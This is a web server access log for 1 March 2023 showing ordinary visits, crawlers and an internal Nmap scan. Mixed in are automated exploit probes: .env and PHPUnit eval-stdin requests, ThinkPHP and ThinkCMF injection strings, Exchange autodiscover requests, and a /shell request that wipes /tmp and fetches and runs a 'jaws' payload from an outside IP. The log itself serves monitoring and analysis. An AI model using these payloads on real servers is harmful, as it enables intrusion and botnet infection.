10.85.51.144 - - [01/Mar/2023:09:45:01 +0600] "GET /template.html HTTP/1.1" 301 169 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/95.0.4638.17 Safari/537.36"
40.77.167.203 - - [01/Mar/2023:09:50:22 +0600] "GET /robots.txt HTTP/1.1" 404 188 "-" "Mozilla/5.0 AppleWebKit/537.36 (KHTML, like Gecko; compatible; bingbot/2.0; +http://www.bing.com/bingbot.htm) Chrome/103.0.5060.134 Safari/537.36"
157.55.39.206 - - [01/Mar/2023:09:50:28 +0600] "GET / HTTP/1.1" 404 188 "-" "Mozilla/5.0 AppleWebKit/537.36 (KHTML, like Gecko; compatible; bingbot/2.0; +http://www.bing.com/bingbot.htm) Chrome/103.0.5060.134 Safari/537.36"
178.89.6.254 - - [01/Mar/2023:09:55:30 +0600] "GET / HTTP/1.1" 301 169 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:109.0) Gecko/20100101 Firefox/110.0"
193.176.31.60 - - [01/Mar/2023:10:22:27 +0600] "GET / HTTP/1.1" 404 125 "-" "Mozilla/5.0 (X11; Linux x86_64; rv:109.0) Gecko/20100101 Firefox/110.0"
193.176.31.60 - - [01/Mar/2023:10:22:28 +0600] "GET /favicon.ico HTTP/1.1" 404 125 "http://5.63.119.55/" "Mozilla/5.0 (X11; Linux x86_64; rv:109.0) Gecko/20100101 Firefox/110.0"
64.62.197.186 - - [01/Mar/2023:10:31:04 +0600] "GET / HTTP/1.1" 404 188 "-" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_6) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/105.0.0.0 Safari/537.36"
95.82.64.188 - - [01/Mar/2023:10:31:41 +0600] "GET / HTTP/1.1" 301 169 "-" "Mozilla/5.0 (iPhone; CPU iPhone OS 16_1_2 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/16.1 Mobile/15E148 Safari/604.1"
64.62.197.189 - - [01/Mar/2023:10:33:37 +0600] "GET /geoserver/web/ HTTP/1.1" 404 188 "-" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_6) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/105.0.0.0 Safari/537.36"
223.240.101.111 - - [01/Mar/2023:10:33:44 +0600] "GET / HTTP/1.1" 404 125 "-" "Mozilla/5.0 (iPhone; CPU iPhone OS 13_2_3 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/13.0.3 Mobile/15E148 Safari/604.1"
85.117.119.108 - - [01/Mar/2023:10:43:55 +0600] "GET / HTTP/1.1" 301 169 "-" "Mozilla/5.0 (Linux; Android 11; Redmi Note 8 Pro) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/110.0.0.0 Mobile Safari/537.36"
2.76.120.42 - - [01/Mar/2023:10:46:16 +0600] "GET / HTTP/1.1" 301 169 "-" "Mozilla/5.0 (iPhone; CPU iPhone OS 15_4_1 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/15.4 Mobile/15E148 Safari/604.1"
10.85.9.76 - - [01/Mar/2023:10:49:17 +0600] "GET / HTTP/1.1" 301 169 "-" "Mozilla/5.0 (iPhone; CPU iPhone OS 15_2 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/15.2 Mobile/15E148 Safari/604.1"
79.137.143.231 - - [01/Mar/2023:10:50:20 +0600] "GET / HTTP/1.1" 301 169 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/89.0.4389.72 Safari/537.36"
79.137.151.229 - - [01/Mar/2023:10:50:20 +0600] "GET / HTTP/1.1" 301 169 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/89.0.4389.72 Safari/537.36"
93.160.62.190 - - [01/Mar/2023:11:03:45 +0600] "GET /.env HTTP/1.1" 404 188 "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.129 Safari/537.36"
93.160.62.190 - - [01/Mar/2023:11:03:45 +0600] "POST / HTTP/1.1" 404 188 "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.129 Safari/537.36"
85.193.121.36 - - [01/Mar/2023:11:08:13 +0600] "GET / HTTP/1.1" 301 169 "-" "Mozilla/5.0 (Linux; Android 10; MED-LX9N; HMSCore 6.9.6.301) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/99.0.4844.88 HuaweiBrowser/13.0.0.312 Mobile Safari/537.36"
51.158.37.156 - - [01/Mar/2023:11:11:45 +0600] "GET / HTTP/1.1" 404 153 "-" "-"
120.92.72.88 - - [01/Mar/2023:11:16:26 +0600] "GET / HTTP/1.1" 301 169 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/46.0.2486.0 Safari/537.36 Edge/13.10586"
120.92.72.88 - - [01/Mar/2023:11:16:35 +0600] "GET / HTTP/1.1" 301 169 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/46.0.2486.0 Safari/537.36 Edge/13.10586"
10.85.51.144 - - [01/Mar/2023:11:31:34 +0600] "GET /template.html HTTP/1.1" 301 169 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/96.0.4664.18 Safari/537.36"
179.43.177.242 - - [01/Mar/2023:11:34:34 +0600] "POST /boaform/admin/formLogin HTTP/1.1" 404 125 "http://5.63.119.55:80/admin/login.asp" "Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:71.0) Gecko/20100101 Firefox/71.0"
179.43.177.242 - - [01/Mar/2023:11:34:34 +0600] "" 400 0 "-" "-"
143.244.50.172 - - [01/Mar/2023:11:52:33 +0600] "GET /config/getuser?index=0 HTTP/1.1" 404 125 "-" "Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:76.0) Gecko/20100101 Firefox/76.0"
95.108.213.241 - - [01/Mar/2023:11:59:03 +0600] "GET /robots.txt HTTP/1.1" 301 169 "-" "Mozilla/5.0 (compatible; YandexBot/3.0; +http://yandex.com/bots)"
95.82.65.5 - - [01/Mar/2023:12:01:41 +0600] "GET / HTTP/1.1" 301 169 "-" "Mozilla/5.0 (Linux; Android 8.1.0; CPH1803) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/104.0.0.0 Mobile Safari/537.36"
10.1.2.78 - - [01/Mar/2023:12:06:53 +0600] "GET / HTTP/1.1" 301 169 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/110.0.0.0 Safari/537.36"
146.0.60.203 - - [01/Mar/2023:12:09:25 +0600] "GET / HTTP/1.1" 301 169 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:109.0) Gecko/20100101 Firefox/110.0"
178.91.253.86 - - [01/Mar/2023:12:22:03 +0600] "GET / HTTP/1.1" 301 169 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/110.0.0.0 Safari/537.36"
37.230.251.75 - - [01/Mar/2023:12:27:11 +0600] "GET /favicon.ico HTTP/1.1" 301 169 "-" "ManicTime/5.0.2.0"
37.230.251.75 - - [01/Mar/2023:12:27:11 +0600] "GET / HTTP/1.1" 301 169 "-" "ManicTime/5.0.2.0"
152.89.196.211 - - [01/Mar/2023:12:29:57 +0600] "POST /vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php HTTP/1.1" 404 188 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/78.0.3904.108 Safari/537.36"
152.89.196.211 - - [01/Mar/2023:12:42:31 +0600] "GET /vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php HTTP/1.1" 404 188 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/78.0.3904.108 Safari/537.36"
5.228.75.58 - - [01/Mar/2023:12:45:05 +0600] "GET /v7/ HTTP/1.1" 301 169 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/108.0.0.0 YaBrowser/23.1.3.949 Yowser/2.5 Safari/537.36"
91.219.188.239 - - [01/Mar/2023:12:45:27 +0600] "GET / HTTP/1.1" 301 169 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/108.0.0.0 YaBrowser/23.1.3.949 Yowser/2.5 Safari/537.36"
95.108.213.241 - - [01/Mar/2023:12:47:35 +0600] "GET / HTTP/1.1" 301 169 "-" "Mozilla/5.0 (compatible; YandexBot/3.0; +http://yandex.com/bots)"
87.236.176.221 - - [01/Mar/2023:13:00:33 +0600] "GET / HTTP/1.1" 404 125 "-" "Mozilla/5.0 (compatible; InternetMeasurement/1.0; +https://internet-measurement.com/)"
92.118.39.82 - - [01/Mar/2023:13:12:22 +0600] "GET / HTTP/1.1" 404 153 "-" "-"
116.202.112.230 - - [01/Mar/2023:13:15:59 +0600] "GET / HTTP/1.1" 301 169 "-" "Mozilla/5.0 (Windows NT 6.3; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/73.0.3683.103 Safari/537.36"
8.142.64.10 - - [01/Mar/2023:13:18:22 +0600] "GET /shell?cd+/tmp;rm+-rf+*;wget+ 107.6.255.132/jaws;sh+/tmp/jaws HTTP/1.1" 404 153 "-" "Hello, world"
152.89.196.211 - - [01/Mar/2023:13:23:31 +0600] "GET /solr/admin/info/system?wt=json HTTP/1.1" 404 188 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/78.0.3904.108 Safari/537.36"
183.136.225.42 - - [01/Mar/2023:13:25:45 +0600] "\x16\x03\x01\x02\x00\x01\x00\x01\xFC\x03\x03^\xED\xDB\x0F\xFB\x9E\x02l\xB3\xA9\x1F\x95\x8F\xE2\xE1L\x98\x80\xFD\x17eh\x17\x9B-\xDC\xFAf.\xA6\xA7\x0F\x00\x00\xDA\x00\x05\x00\x04\x00\x02\x00\x01\x00\x16\x003\x009\x00:\x00\x18\x005\x00" 400 157 "-" "-"
183.136.225.32 - - [01/Mar/2023:13:27:24 +0600] "GET / HTTP/1.1" 404 153 "-" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10.11; rv:47.0) Gecko/20100101 Firefox/47.0"
183.136.225.32 - - [01/Mar/2023:13:32:28 +0600] "GET / HTTP/1.1" 404 188 "-" "Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/63.0.3239.132 Safari/537.36 QIHU 360SE"
183.136.225.32 - - [01/Mar/2023:13:32:34 +0600] "GET /favicon.ico HTTP/1.1" 404 188 "-" "Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/63.0.3239.132 Safari/537.36 QIHU 360SE"
183.136.225.32 - - [01/Mar/2023:13:32:34 +0600] "GET /robots.txt HTTP/1.1" 404 188 "-" "Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/63.0.3239.132 Safari/537.36 QIHU 360SE"
20.191.45.212 - - [01/Mar/2023:13:38:45 +0600] "GET / HTTP/1.1" 301 169 "http://edu.enu.kz/" "Mozilla/5.0 (compatible; DuckDuckGo-Favicons-Bot/1.0; +http://duckduckgo.com)"
173.236.217.113 - - [01/Mar/2023:13:41:43 +0600] "HEAD / HTTP/1.1" 301 0 "-" "-"
173.236.217.113 - - [01/Mar/2023:13:41:53 +0600] "HEAD / HTTP/1.1" 301 0 "-" "-"
109.194.33.163 - - [01/Mar/2023:13:46:02 +0600] "GET / HTTP/1.1" 404 188 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/110.0.0.0 Safari/537.36"
109.194.33.163 - - [01/Mar/2023:13:46:03 +0600] "GET /favicon.ico HTTP/1.1" 404 188 "http://5.63.119.55/" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/110.0.0.0 Safari/537.36"
65.154.226.169 - - [01/Mar/2023:13:46:39 +0600] "GET / HTTP/1.1" 404 188 "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) HeadlessChrome/110.0.5481.77 Safari/537.36"
95.108.213.241 - - [01/Mar/2023:13:50:47 +0600] "GET / HTTP/1.1" 301 169 "-" "Mozilla/5.0 (compatible; YandexBot/3.0; +http://yandex.com/bots)"
95.82.73.240 - - [01/Mar/2023:13:55:41 +0600] "GET / HTTP/1.1" 301 169 "-" "Mozilla/5.0 (iPhone; CPU iPhone OS 16_0_3 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/16.0 Mobile/15E148 Safari/604.1"
54.197.92.227 - - [01/Mar/2023:14:09:53 +0600] "\x16\x03\x01\x00\xEE\x01\x00\x00\xEA\x03\x03fe*\xF9`?\xFF\xA7\x8B\x80\x0E\x88=\x5C\x01\x22L\xE0*Nw\xD6`?\x8B\xA3.q\xB4\x12\xDE\xEC \x00S\xA6\xBCum\xBCa\x04\x01\x91\x96\xD4\x138\xCB\x01\x1C@<0s\xFD\xF57\xE7&?\x1A\xFC\x80\xF6\x00&\xC0+\xC0/\xC0,\xC00\xCC\xA9\xCC\xA8\xC0\x09\xC0\x13\xC0" 400 157 "-" "-"
54.197.92.227 - - [01/Mar/2023:14:09:55 +0600] "\x16\x03\x01\x00\xEE\x01\x00\x00\xEA\x03\x03s\x88\xE9\xD4\xCFQ.\xCF\xE9i6\xEA\xFF\x1E\xC3T\xB9\xB4:\xA8\x04V\xED\xED\xC5\x88\x87N\xE9\x15Y\xA0 \xBF\xF7U\xAA\xE2J\xC3\x93Km\xE4\xFE\x90AN\x0FI\x00\x97c\xA7\xD6K\xE5\x07\xD7\xEA]}\xFC`\x04\x00&\xC0+\xC0/\xC0,\xC00\xCC\xA9\xCC\xA8\xC0\x09\xC0\x13\xC0" 400 157 "-" "-"
54.197.92.227 - - [01/Mar/2023:14:09:55 +0600] "HEAD / HTTP/1.1" 404 0 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/70.0.3538.77 Safari/537.36"
54.197.92.227 - - [01/Mar/2023:14:16:00 +0600] "GET /autodiscover/autodiscover.json?@test.com/owa/?&Email=autodiscover/autodiscover.json%3F@test.com HTTP/1.1" 404 188 "-" "Mozilla/5.0 (Windows NT 4.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/37.0.2049.0 Safari/537.36"
54.197.92.227 - - [01/Mar/2023:14:16:01 +0600] "GET /autodiscover/autodiscover.json?@test.com/mapi/nspi/?&Email=autodiscover/autodiscover.json%3F@test.com HTTP/1.1" 404 188 "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/41.0.2227.0 Safari/537.36"
51.158.37.156 - - [01/Mar/2023:14:24:12 +0600] "GET / HTTP/1.1" 404 153 "-" "-"
95.108.213.241 - - [01/Mar/2023:14:30:02 +0600] "GET / HTTP/1.1" 301 169 "-" "Mozilla/5.0 (compatible; YandexWebmaster/2.0; +http://yandex.com/bots)"
95.108.213.241 - - [01/Mar/2023:14:30:04 +0600] "GET /robots.txt HTTP/1.1" 301 169 "-" "Mozilla/5.0 (compatible; YandexWebmaster/2.0; +http://yandex.com/bots)"
47.92.33.185 - - [01/Mar/2023:14:42:25 +0600] "GET / HTTP/1.1" 301 169 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/90.0.4430.93 Safari/537.36"
47.92.33.185 - - [01/Mar/2023:14:42:26 +0600] "GET / HTTP/1.1" 301 169 "-" "Apache-HttpClient/5.1.3 (Java/1.8.0_342)"
152.89.196.211 - - [01/Mar/2023:14:43:40 +0600] "GET /index.php?s=/Index/\x5Cthink\x5Capp/invokefunction&function=call_user_func_array&vars[0]=md5&vars[1][]=HelloThinkPHP21 HTTP/1.1" 404 188 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/78.0.3904.108 Safari/537.36"
95.82.73.180 - - [01/Mar/2023:14:43:52 +0600] "GET / HTTP/1.1" 301 169 "-" "Mozilla/5.0 (iPhone; CPU iPhone OS 16_3 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) CriOS/110.0.5481.114 Mobile/15E148 Safari/604.1"
95.108.213.241 - - [01/Mar/2023:14:54:56 +0600] "GET / HTTP/1.1" 301 169 "-" "Mozilla/5.0 (compatible; YandexBot/3.0; +http://yandex.com/bots)"
2.75.121.155 - - [01/Mar/2023:15:01:52 +0600] "GET / HTTP/1.1" 301 169 "-" "Mozilla/5.0 (iPhone; CPU iPhone OS 16_0 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/16.0 Mobile/15E148 Safari/604.1"
2.75.121.155 - - [01/Mar/2023:15:03:36 +0600] "GET / HTTP/1.1" 301 169 "-" "Mozilla/5.0 (iPhone; CPU iPhone OS 16_0 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/16.0 Mobile/15E148 Safari/604.1"
77.245.107.127 - - [01/Mar/2023:15:05:15 +0600] "GET / HTTP/1.1" 301 169 "-" "Mozilla/5.0 (iPhone; CPU iPhone OS 16_0 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/16.0 Mobile/15E148 Safari/604.1"
188.64.166.155 - - [01/Mar/2023:15:19:33 +0600] "GET /v7/ HTTP/1.1" 301 169 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/110.0.0.0 Safari/537.36"
95.161.221.59 - - [01/Mar/2023:15:20:12 +0600] "GET /index?lang=1 HTTP/1.1" 301 169 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/110.0.0.0 Safari/537.36"
95.82.72.204 - - [01/Mar/2023:15:21:11 +0600] "GET / HTTP/1.1" 301 169 "-" "Mozilla/5.0 (iPhone; CPU iPhone OS 16_3_1 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/16.3 Mobile/15E148 Safari/604.1"
10.1.0.230 - - [01/Mar/2023:15:24:20 +0600] "GET / HTTP/1.1" 301 169 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/110.0.0.0 Safari/537.36"
95.82.72.103 - - [01/Mar/2023:15:24:41 +0600] "GET / HTTP/1.1" 301 169 "-" "Mozilla/5.0 (iPhone; CPU iPhone OS 16_0_2 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/16.0 Mobile/15E148 Safari/604.1"
10.85.35.125 - - [01/Mar/2023:15:28:32 +0600] "GET /favicon.ico HTTP/1.1" 301 169 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/108.0.0.0 YaBrowser/23.1.3.949 Yowser/2.5 Safari/537.36"
95.82.71.177 - - [01/Mar/2023:15:29:01 +0600] "GET / HTTP/1.1" 301 169 "-" "Mozilla/5.0 (Linux; Android 13) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/110.0.5481.153 Mobile DuckDuckGo/5 Safari/537.36"
152.89.196.211 - - [01/Mar/2023:15:38:09 +0600] "GET /?a=fetch&content=<php>die(@md5(HelloThinkCMF))</php> HTTP/1.1" 404 188 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/78.0.3904.108 Safari/537.36"
195.211.23.214 - - [01/Mar/2023:15:41:02 +0600] "GET / HTTP/1.1" 301 169 "-" "Python/3.8 aiohttp/3.6.2"
95.108.213.241 - - [01/Mar/2023:15:59:03 +0600] "GET /robots.txt HTTP/1.1" 301 169 "-" "Mozilla/5.0 (compatible; YandexBot/3.0; +http://yandex.com/bots)"
37.151.71.44 - - [01/Mar/2023:16:12:06 +0600] "GET / HTTP/1.1" 301 169 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/110.0.0.0 Safari/537.36 Edg/110.0.1587.57"
10.2.1.124 - - [01/Mar/2023:16:15:48 +0600] "GET / HTTP/1.0" 301 169 "-" "-"
10.2.1.124 - - [01/Mar/2023:16:16:11 +0600] "OPTIONS / HTTP/1.1" 404 153 "-" "Mozilla/5.0 (compatible; Nmap Scripting Engine; https://nmap.org/book/nse.html)"
10.2.1.124 - - [01/Mar/2023:16:16:11 +0600] "POST / HTTP/1.1" 404 153 "-" "Mozilla/5.0 (compatible; Nmap Scripting Engine; https://nmap.org/book/nse.html)"
10.2.1.124 - - [01/Mar/2023:16:16:11 +0600] "EELZ / HTTP/1.1" 404 153 "-" "Mozilla/5.0 (compatible; Nmap Scripting Engine; https://nmap.org/book/nse.html)"
10.2.1.124 - - [01/Mar/2023:16:16:11 +0600] "GET / HTTP/1.1" 404 153 "-" "Mozilla/5.0 (compatible; Nmap Scripting Engine; https://nmap.org/book/nse.html)"
10.2.1.124 - - [01/Mar/2023:16:16:11 +0600] "GET / HTTP/1.0" 301 169 "-" "-"
10.2.1.124 - - [01/Mar/2023:16:16:11 +0600] "HEAD / HTTP/1.1" 404 0 "-" "Mozilla/5.0 (compatible; Nmap Scripting Engine; https://nmap.org/book/nse.html)"
10.2.1.124 - - [01/Mar/2023:16:16:11 +0600] "GET / HTTP/1.1" 404 153 "-" "Mozilla/5.0 (compatible; Nmap Scripting Engine; https://nmap.org/book/nse.html)"
10.2.1.124 - - [01/Mar/2023:16:16:11 +0600] "GET /.git/HEAD HTTP/1.1" 404 153 "-" "Mozilla/5.0 (compatible; Nmap Scripting Engine; https://nmap.org/book/nse.html)"
10.2.1.124 - - [01/Mar/2023:16:16:11 +0600] "GET /robots.txt HTTP/1.1" 404 153 "-" "Mozilla/5.0 (compatible; Nmap Scripting Engine; https://nmap.org/book/nse.html)"
10.2.1.124 - - [01/Mar/2023:16:16:11 +0600] "OPTIONS / HTTP/1.1" 404 153 "-" "Mozilla/5.0 (compatible; Nmap Scripting Engine; https://nmap.org/book/nse.html)"
10.2.1.124 - - [01/Mar/2023:16:16:11 +0600] "GET /nmaplowercheck1677665770 HTTP/1.1" 404 153 "-" "Mozilla/5.0 (compatible; Nmap Scripting Engine; https://nmap.org/book/nse.html)"
10.2.1.124 - - [01/Mar/2023:16:16:12 +0600] "PROPFIND / HTTP/1.1" 404 153 "-" "Mozilla/5.0 (compatible; Nmap Scripting Engine; https://nmap.org/book/nse.html)"
10.2.1.124 - - [01/Mar/2023:16:16:12 +0600] "GET /favicon.ico HTTP/1.1" 404 153 "-" "Mozilla/5.0 (compatible; Nmap Scripting Engine; https://nmap.org/book/nse.html)"
10.2.1.124 - - [01/Mar/2023:16:16:12 +0600] "OPTIONS / HTTP/1.1" 404 153 "-" "Mozilla/5.0 (compatible; Nmap Scripting Engine; https://nmap.org/book/nse.html)"
10.2.1.124 - - [01/Mar/2023:16:16:12 +0600] "GET /HNAP1 HTTP/1.1" 404 153 "-" "Mozilla/5.0 (compatible; Nmap Scripting Engine; https://nmap.org/book/nse.html)"
10.2.1.124 - - [01/Mar/2023:16:16:12 +0600] "POST / HTTP/1.1" 404 153 "-" "Mozilla/5.0 (compatible; Nmap Scripting Engine; https://nmap.org/book/nse.html)"
10.2.1.124 - - [01/Mar/2023:16:16:12 +0600] "OPTIONS / HTTP/1.1" 404 153 "-" "Mozilla/5.0 (compatible; Nmap Scripting Engine; https://nmap.org/book/nse.html)"
10.2.1.124 - - [01/Mar/2023:16:16:12 +0600] "PROPFIND / HTTP/1.1" 404 153 "-" "Mozilla/5.0 (compatible; Nmap Scripting Engine; https://nmap.org/book/nse.html)"
10.2.1.124 - - [01/Mar/2023:16:16:12 +0600] "OPTIONS / HTTP/1.1" 404 153 "-" "Mozilla/5.0 (compatible; Nmap Scripting Engine; https://nmap.org/book/nse.html)"
10.2.1.124 - - [01/Mar/2023:16:16:12 +0600] "OPTIONS / HTTP/1.1" 404 153 "-" "Mozilla/5.0 (compatible; Nmap Scripting Engine; https://nmap.org/book/nse.html)"
10.2.1.124 - - [01/Mar/2023:16:16:12 +0600] "GET / HTTP/1.1" 404 153 "-" "Mozilla/5.0 (compatible; Nmap Scripting Engine; https://nmap.org/book/nse.html)"
10.2.1.124 - - [01/Mar/2023:16:16:12 +0600] "GET /evox/about HTTP/1.1" 404 153 "-" "Mozilla/5.0 (compatible; Nmap Scripting Engine; https://nmap.org/book/nse.html)"
10.2.1.124 - - [01/Mar/2023:16:16:12 +0600] "OPTIONS / HTTP/1.1" 404 153 "-" "Mozilla/5.0 (compatible; Nmap Scripting Engine; https://nmap.org/book/nse.html)"
10.2.1.124 - - [01/Mar/2023:16:16:12 +0600] "POST /sdk HTTP/1.1" 404 153 "-" "Mozilla/5.0 (compatible; Nmap Scripting Engine; https://nmap.org/book/nse.html)"
10.2.1.124 - - [01/Mar/2023:16:16:12 +0600] "OPTIONS / HTTP/1.1" 404 153 "-" "Mozilla/5.0 (compatible; Nmap Scripting Engine; https://nmap.org/book/nse.html)"
10.2.1.124 - - [01/Mar/2023:16:16:12 +0600] "OPTIONS / HTTP/1.1" 404 153 "-" "Mozilla/5.0 (compatible; Nmap Scripting Engine; https://nmap.org/book/nse.html)"
10.2.1.124 - - [01/Mar/2023:16:16:12 +0600] "OPTIONS / HTTP/1.1" 404 153 "-" "Mozilla/5.0 (compatible; Nmap Scripting Engine; https://nmap.org/book/nse.html)"
10.2.1.124 - - [01/Mar/2023:16:16:13 +0600] "PROPFIND / HTTP/1.1" 404 153 "-" "Mozilla/5.0 (compatible; Nmap Scripting Engine; https://nmap.org/book/nse.html)"
10.2.1.124 - - [01/Mar/2023:16:16:13 +0600] "OPTIONS / HTTP/1.1" 404 153 "-" "Mozilla/5.0 (compatible; Nmap Scripting Engine; https://nmap.org/book/nse.html)"
10.2.1.124 - - [01/Mar/2023:16:16:13 +0600] "OPTIONS / HTTP/1.1" 404 153 "-" "Mozilla/5.0 (compatible; Nmap Scripting Engine; https://nmap.org/book/nse.html)"
10.2.1.124 - - [01/Mar/2023:16:16:41 +0600] "GET / HTTP/1.0" 301 169 "-" "-"
10.2.1.124 - - [01/Mar/2023:16:16:41 +0600] "GET / HTTP/1.1" 404 153 "-" "-"
165.1.184.83 - - [01/Mar/2023:16:42:08 +0600] "GET / HTTP/1.1" 301 169 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/110.0.0.0 Safari/537.36 Edg/110.0.1587.57"
143.244.50.172 - - [01/Mar/2023:16:43:09 +0600] "GET /config/getuser?index=0 HTTP/1.1" 404 125 "-" "Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:76.0) Gecko/20100101 Firefox/76.0"
